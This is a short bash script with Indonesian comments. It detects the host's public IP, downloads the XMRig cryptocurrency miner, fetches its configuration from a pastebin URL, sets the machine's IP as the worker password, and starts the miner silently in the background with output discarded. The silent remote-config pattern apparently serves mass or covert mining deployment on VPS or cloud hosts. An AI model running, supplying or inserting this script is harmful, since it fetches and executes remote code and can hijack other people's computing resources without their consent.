#!/bin/bash

# 1. Mendapatkan IP Address
# Gunakan baris ini untuk IP Publik (VPS/Cloud):
IP=$(curl -s ifconfig.me)

# ATAU jika ingin memakai IP Lokal/LAN, hapus tanda '#' di baris bawah ini:
# IP=$(hostname -I | awk '{print $1}')

echo "IP terdeteksi: $IP"

# 2. Unduh XMRig
echo "Mengunduh XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz -O xmrig-6.26.0.tar.gz

# 3. Ekstrak file
echo "Mengekstrak file..."
tar -xf xmrig-6.26.0.tar.gz

# 4. Masuk ke direktori
cd xmrig-6.26.0 || exit 1

# 5. Unduh konfigurasi
echo "Mengunduh config.json..."
wget -q https://pastebin.com/raw/3eYNq8A2 -O config.json

# 6. Ubah "pass": "siji2" menjadi IP Address otomatis
echo "Mengubah pass di config.json menjadi $IP..."
sed -i "s/\"pass\": \"siji2\"/\"pass\": \"$IP\"/g" config.json

# 7. Beri izin eksekusi dan jalankan di background
chmod +x xmrig
echo "Menjalankan XMRig di background..."
nice -n 1 ./xmrig >/dev/null 2>&1 &

echo "Selesai! XMRig berjalan dengan pass: $IP"
